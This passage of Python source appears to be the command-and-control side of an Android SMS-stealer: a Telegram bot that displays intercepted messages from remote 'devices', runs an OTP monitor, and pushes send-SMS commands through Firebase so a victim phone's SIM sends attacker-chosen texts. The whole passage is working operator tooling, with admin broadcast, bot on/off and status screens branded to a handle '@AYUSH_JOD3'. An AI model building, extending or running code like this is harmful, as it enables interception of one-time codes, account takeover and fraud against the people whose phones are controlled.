        text = f"""📨 <b>LIVE MESSAGES</b> (Latest {len(recent)})
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
──────────────────────────────
{all_text}
──────────────────────────────"""

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        build_inline_button("Refresh", callback_data=f"seemgs_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")),
        build_inline_button("Back", callback_data=f"showcard_1_{client_id}", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌"))
    )
    
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard, parse_mode='HTML', disable_web_page_preview=True)
            return
        except Exception:
            pass
            
    safe_send_message(chat_id, text, reply_markup=keyboard, disable_web_page_preview=True)

def process_disconnect(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, """
❌ BOT CURRENTLY OFF ❌

PLEASE CONTACT OWNER
         ☠️ @AYUSH_JOD3 ☠️
""")
        return
    
    device_status = "Not connected ❌"
    sms_channel_status = "Not connected ❌"
    otp_monitor_status = "Not connected ❌"
    
    if user_id in user_connected_device:
        user_connected_device.pop(user_id, None)
        device_status = "Disconnected ✅"
    
    if user_id in user_selected_sim:
        user_selected_sim.pop(user_id, None)
    
    if user_id in user_channel_data:
        user_channel_data.pop(user_id, None)
        sms_channel_status = "Disconnected ✅"
    
    if user_id in otp_monitoring:
        del otp_monitoring[user_id]
        otp_monitor_status = "Stopped ⏸️"
    
    if user_id in user_last_message_keys:
        del user_last_message_keys[user_id]
    
    if user_id in user_locked_messages:
        del user_locked_messages[user_id]
    
    if user_id in user_forward_number:
        del user_forward_number[user_id]
    
    if user_id in user_forward_states:
        del user_forward_states[user_id]
    
    save_data()
    
    firebase_status = "Connected ✅" if user_id in user_firebase else "Not connected ❌"
    otp_channel_status = "Connected ✅" if user_id in user_otp_channel else "Not connected ❌"
    
    safe_send_message(chat_id, f"""
💔 DISCONNECTED

📊 Status:
🩸 Firebase - {firebase_status}
📱 Device - {device_status}
📢 SMS Channel - {sms_channel_status}
💌 OTP Channel - {otp_channel_status}
🔄 OTP Monitor - {otp_monitor_status}

🔁 Firebase & OTP Channel connected hain!
📱 New device ke liye ONLINE press karo
""")

@bot.message_handler(func=lambda message: message.text in ["DISCONNECT", "Disconnect", "/disconnect"])
def disconnect_handler(message):
    process_disconnect(message.from_user.id, message.chat.id)

def process_bot_mode(user_id, chat_id):
    if user_id != ADMIN_ID:
        safe_send_message(chat_id, "❌ This is admin only feature!")
        return
    
    update_user_activity(user_id)
    global bot_mode
    
    if bot_mode:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(build_inline_button("Turn Off Bot", callback_data="bot_off", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🛑")))
        
        safe_send_message(chat_id, """
──────────────────────────────
     ⚙️ BOT MODE ⚙️       
──────────────────────────────

🟢 <b>Current Status: ONLINE</b>
👥 All users can access the bot

💡 <i>Click below to turn bot OFF</i>
""", reply_markup=keyboard)
    else:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(build_inline_button("Turn On Bot", callback_data="bot_on", style="success", icon_custom_emoji_id=CUSTOM_EMOJIS.get("⚡")))
        
        safe_send_message(chat_id, """
──────────────────────────────
     ⚙️ BOT MODE ⚙️       
──────────────────────────────

🔴 <b>Current Status: OFFLINE</b>
👤 Only admin can use the bot

💡 <i>Click below to turn bot ON</i>
""", reply_markup=keyboard)

@bot.message_handler(func=lambda message: message.text in ["Bot Mode", "BOT MODE", "/bot_mode"])
def bot_mode_handler(message):
    process_bot_mode(message.from_user.id, message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "bot_on")
def bot_on_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "Access restricted to Admin", show_alert=True)
        return
    
    global bot_mode
    bot_mode = True
    save_data()
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    safe_send_message(chat_id, """
🟢 BOT IS NOW ON

Users can use bot now ✅
""")
    bot.answer_callback_query(call.id, "Bot activated successfully")

@bot.callback_query_handler(func=lambda call: call.data == "bot_off")
def bot_off_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "Access restricted to Admin", show_alert=True)
        return
    
    global bot_mode
    bot_mode = False
    save_data()
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    safe_send_message(chat_id, """
🔴 BOT IS NOW OFF

Users cannot use bot now ❌
""")
    bot.answer_callback_query(call.id, "Bot deactivated successfully")

def process_broadcast(user_id, chat_id):
    if user_id != ADMIN_ID:
        safe_send_message(chat_id, "❌ This is admin only feature!")
        return
    
    update_user_activity(user_id)
    
    user_states[user_id] = "waiting_for_broadcast"
    safe_send_message(chat_id, f"""
📲 PLEASE SEND BROADCAST MESSAGE

📊 Total Users: {len(user_all_ids)}

This will be sent to all users!
""")

@bot.message_handler(func=lambda message: message.text in ["Broadcast", "BROADCAST", "/broadcast"])
def broadcast_handler(message):
    process_broadcast(message.from_user.id, message.chat.id)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_broadcast")
def handle_broadcast(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    broadcast_text = message.text.strip()
    
    if user_id != ADMIN_ID:
        user_states.pop(user_id, None)
        return
    
    update_user_activity(user_id)
    user_states.pop(user_id, None)
    
    sent_count = 0
    failed_count = 0
    
    safe_send_message(chat_id, f"📲 Sending broadcast to {len(user_all_ids)} users...")
    
    for uid in list(user_all_ids):
        try:
            safe_send_message(uid, f"""
📢 BROADCAST MESSAGE

──────────────────────────────
{broadcast_text}
──────────────────────────────

☠️ @AYUSH_JOD3
""")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(chat_id, f"""
✅ BROADCAST COMPLETED

📊 Results:
✅ Sent: {sent_count}
❌ Failed: {failed_count}
""")

@bot.message_handler(func=lambda message: message.chat and message.chat.type in ['group', 'supergroup'])
def handle_group_message(message):
    handle_channel_post(message)

@bot.channel_post_handler(func=lambda message: True)
def handle_channel_post(message):
    try:
        if not bot_mode:
            return
            
        channel_id = message.chat.id
        msg_text = message.text or message.caption or ""
        
        if not msg_text:
            return
        
        to_number, sms_message = extract_sms_details(msg_text)
        
        if not to_number or not sms_message:
            return
        
        token_user_id = None
        for user_id, token_data in user_token_channel.items():
            if token_data.get("channel_id") == channel_id:
                token_user_id = user_id
                break
        
        if token_user_id is not None:
            user_id = token_user_id
            logger.info(f"✅ Using TOKEN CN channel for user {user_id}")
        else:
            for user_id, channel_data in user_channel_data.items():
                if channel_data.get("channel_id") == channel_id:
                    break
            else:
                return
        
        if user_id not in user_selected_sim:
            logger.warning(f"❌ User {user_id} has no SIM selected")
            safe_send_message(user_id, "❌ Please select a SIM first!")
            return
        
        if user_id not in user_firebase:
            logger.warning(f"❌ User {user_id} has no Firebase")
            return
        
        sim_info = user_selected_sim[user_id]
        fb_list = user_firebase.get(user_id, {})
        if not fb_list:
            return
        
        for fb_id, fb_data in fb_list.items():
            try:
                db = fb_data["db"]
                
                client_data = get_client_by_id(db, sim_info["client_id"])
                if not client_data:
                    logger.warning(f"❌ Client {sim_info['client_id']} not found in Firebase")
                    continue
                
                sims = extract_sims(client_data)
                selected_sim_index = sim_info.get("sim_index")
                if selected_sim_index is None:
                    selected_sim_index = 0
                sim_num = selected_sim_index + 1
                
                selected_sim = get_sim_for_slot(sims, selected_sim_index)
                has_sim_now = selected_sim is not None or len(sims) > 0
                if selected_sim is None and sims:
                    selected_sim = sims[0]
                
                if has_sim_now and selected_sim:
                    from_number = selected_sim.get("phoneNumber", "")
                    carrier_name = selected_sim.get("carrierName", f"Slot {selected_sim_index}")
                    
                    user_selected_sim[user_id]["sim_data"] = selected_sim
                    user_selected_sim[user_id]["no_sim"] = False
                    
                    sms_data = {
                        "from": selected_sim_index,
                        "sim": selected_sim_index,
                        "simSlot": selected_sim_index,
                        "fromSlot": selected_sim_index,
                        "isSended": False,
                        "isSent": False,
                        "action": "send_sms",
                        "command": "sendSMS",
                        "message": sms_message,
                        "messageText": sms_message,
                        "sms": sms_message,
                        "to": to_number,
                        "number": to_number,
                        "address": to_number,
                        "destination": to_number,
                        "phoneNumber": to_number,
                        "priority": "high",
                        "status": "pending",
                        "timestamp": int(time.time() * 1000)
                    }
                    
                    send_success = False
                    try:
                        db.child(f"clients/{sim_info['client_id']}/webhookEvent/sendSms").set(sms_data)
                        send_success = True
                    except Exception:
                        pass
                    
                    try:
                        db.child(f"clients/{sim_info['client_id']}/sendSms").set(sms_data)
                        send_success = True
                    except Exception:
                        pass
                        
                    try:
                        db.child(f"clients/{sim_info['client_id']}/action").set(sms_data)
                        send_success = True
                    except Exception:
                        pass
                        
                    try:
                        db.child(f"clients/{sim_info['client_id']}/command").set(sms_data)
                        send_success = True
                    except Exception:
                        pass
                        
                    try:
                        db.child(f"user_data/{sim_info['client_id']}").set({
                            "command": "send message",
                            "device": sim_info['client_id'],
                            "messageText": sms_message,
                            "phoneNumber": to_number,
                            "simSlot": str(selected_sim_index)
                        })
                    except Exception:
                        pass
                    
                    if send_success:
                        cur_time = datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')
                        safe_send_message(user_id, f"""⚡ <b>TOKEN SENT SUCCESSFULLY</b>
──────────────────────────────
🆔 <b>Device ID:</b> <code>{sim_info['client_id']}</code>
📶 <b>Sent via SIM:</b> <b>SIM {sim_num} ({carrier_name})</b>
📞 <b>To Number:</b> <code>{to_number}</code>
🕐 <b>Time:</b> {cur_time}
──────────────────────────────
💬 <b>Token Details:</b>
<code>{sms_message}</code>
──────────────────────────────
✅ <i>Token dispatched instantly via device SIM!</i>""", disable_web_page_preview=True)
                    else:
                        safe_send_message(user_id, "❌ Failed to send SMS!")
                else:
                    sms_data = {
                        "from": selected_sim_index,
                        "isSended": False,
                        "message": sms_message,
                        "to": to_number
                    }
                    
                    try:
                        db.child(f"clients/{sim_info['client_id']}/webhookEvent/sendSms").set(sms_data)
                    except Exception as e:
                        logger.error(f"❌ Error queueing to webhookEvent: {e}")
                    
                    try:
                        db.child(f"clients/{sim_info['client_id']}/sendSms").set(sms_data)
                    except:
                        pass
                        
                    safe_send_message(user_id, f"""
──────────────────────────────
  ⏳ SMS PENDING - SIM NOT AVAILABLE 
──────────────────────────────

🆔 Device: <code>{sim_info['client_id'][:12]}...</code>
📶 Selected SIM: <b>SIM {sim_num} (SIM Not Available)</b>
📞 To: <code>{to_number}</code>
💬 Message: <code>{sms_message}</code>

⚠️ <i>SIM {sim_num} is currently not available on this device. SMS has been queued and will automatically be sent using SIM {sim_num} as soon as it becomes available.</i>
""")
                    
            except Exception as e:
                logger.error(f"❌ Channel post error: {e}")
                safe_send_message(user_id, f"❌ Error: {str(e)}")
                
    except Exception as e:
        logger.error(f"❌ Channel post error: {e}")

print(f"""
   🔥 BOT STARTED - TELEGRAM API 9.4 (VERSION {BOT_VERSION}) 🔥         
""")

save_bot_version()

load_data()

print(f"📊 Total Users: {len(user_all_ids)}")
print(f"📊 Total Firebase Connections: {len(user_firebase)}")
print(f"📊 Token Channels: {len(user_token_channel)}")
print(f"📌 Bot Version: {BOT_VERSION}")
print(f"🕐 Last Update: {LAST_UPDATE_TIME}")

if __name__ == '__main__':
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=15, skip_pending=True)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)